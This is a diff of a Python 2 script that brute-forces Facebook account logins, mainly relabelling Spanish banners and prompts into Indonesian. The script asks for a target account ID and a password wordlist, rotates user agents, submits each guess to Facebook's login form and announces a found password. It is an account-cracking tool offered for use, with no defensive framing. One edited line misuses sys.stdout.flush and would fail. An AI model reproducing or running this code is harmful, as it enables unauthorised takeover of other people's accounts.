@@ -40,29 +40,27 @@ def cover():
     
     
      """
-    runntek(GL+"           YouTube'@TecnoSolution ^_^...")
-    time.sleep(1)
+    runntek(BB+"           Memasuki system BRUTEFORCEF8. . ...")
+    time.sleep(2)
     print " "
     print RR+"  +============================================+"
-    print GG+"  |¢â€€   HACK FACEBOOK By TecnoSolution   ¢â€¢|"
+    print RR+"  | PROGRAM PENGEMBANGAN SYSTEM KEAMANAN M3DPR0|"
     print RR+"  +============================================+"
-    print WW+"  |            Script BY: TecnoSolution        |"
-    print GG+"  |              Reza antes de usar            |"
-    print WW+"  |            FACEBOOK: TecnoSolution         |"
-    print Y+"   |             YouTube: TecnoSolution         |"
-    print WW+"  |--------------------------------------------|"
-    print GL+"  |        LIFE OF PROGRAMMER [ L.O.P ]        |"
-    print WW+"  |--------------------------------------------|"
-    print RR+"  +============================================+"
-    print GG+"  |¢â€€   HACK FACEBOOK By TecnoSolution   ¢â€¢|"
-    print RR+"  +============================================+"     
+    print RR+"  |         SCRIPT     : File OSIF             |"
+    print RR+"  |         REPOSTORY  : SAN-Brother           |"
+    print RR+"  |         CODER	     : Susanto               |"
+    print RR+"  |         PROGRAM    : Versi.1.0.1           |"
+    print RR+"  |--------------------------------------------|"
+    print RR+"  |     OPEN SOURC INFORMATION FACEBOOK F8     |"
+    print RR+"  |--------------------------------------------|"
+    print RR+"  +============================================+" 
 
 
 cover()
 
-email = str(raw_input(GL+" â€¢Introduzca la ID del objetivo\033[33;1m: "))
+email = str(raw_input(BB+"Target Crack... \033[33;1m: "))
 
-passwordlist = str(raw_input(WW+" â€¢Ingrese el archivo de Contraseñas\033[95m[ pass.txt, pass1.txt, pass2.txt, pass3.txt ] \033[92;1m: "))
+passwordlist = str(raw_input(BB+" Code Password... \033[95m[ pass.txt ] \033[92;1m: "))
 
 
 #login = 'https://m.facebook.com/login/?ref=dbl&fl&refid=8'
@@ -94,23 +92,23 @@ def main():
         search()
         print " "
         runntek(RR+"  Wordlis Tidak Ada yang Cocok")
-        runntek(RR+"  Kembangin Wordlistnya Sendiri Cuk")
+        runntek(RR+"  Gunakan PasswordList yg lain!")
         time.sleep(1)
         print WW+34*"  -"
         kol()
 
 def kol():
-    nok = raw_input("Edit wordlist cuk.? \033[96;1m[y/n]: ")
+    nok = raw_input("Keluar program \033[96;1m[y/n]: ")
     if nok == "y":
-        print ("Por favor escriba la orden\033[92;1m[ nano pass.txt ] !")
+        print ("Membuat...\033[92;1m[ nano pass.txt ] !")
         print WW+(41*"-")
         print GL+(" ")
         os.sys.exit()
     else:
         exit(0)
 def brute(password):
-        sys.stdout.write(GG+"\r[+]\033[97;1m Probando ..... {}\n".format(password))
-        sys.stdout.flush()
+        sys.stdout.write(RR+"\r[+]\033[97;1m Mencoba... {}\n".format(password))
+        sys.stdout.flush(RR+"\r[x]\033[97;1m Salah... {}\n")
         br.addheaders = [('User-agent', random.choice(useragents))]
         site = br.open(login)
         br.select_form(nr = 0)
@@ -119,9 +117,9 @@ def brute(password):
         sub = br.submit()
         log = sub.geturl()
         if log != login and (not 'login_attempt' in log):
-                        print("\033[92;1m\n\n[+]\033[97;1m Password Encontrada \033[31;1m===| \033[96;1m{}".format(password)) 
+                        print("\033[92;1m\n\n[+]\033[97;1m Password Ditemukan \033[31;1m===| \033[96;1m{}".format(password)) 
                         print " "
-                        raw_input(WW+"PULSE ENTER PARA SALIR.....")
+                        raw_input(WW+"LANGSUNG EKSEKUSI!!!")
                         sys.exit(1)
 
 
@@ -135,20 +133,16 @@ def search():
 
 #welcome
 def welcome():
-        wel = GG+"""
-No olvides suscribirte al Canal de Youtube "TecnoSolution" 
-Y darle LIKE al Video.... Gracias!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \033[96;4mLife Of Programmer\033[92;1m
-       |_|
-      """
+        wel = GG+" Tunggu sebentar... \033[96;4m"
         print wel
         print " "
         total = open(passwordlist,"r")
         total = total.readlines()
         print " "
-        print GL+" [*] Cuenta a Crackear : {}".format(email)
-        print RR+" [*] Cantidad :" , len(total),WW+ "passwords"
-        print Y+" [*] Cracking, please wait .....\n\n"
+        print GL+" [*] Crack Akun : {}".format(email)
+        print RR+" [*] Password Terbaca :" , len(total),WW+ "passwords"
+	 runntek(RR+" Sedang memulai ...")
+        time.sleep(1)
 
 if __name__ == '__main__':
         main()
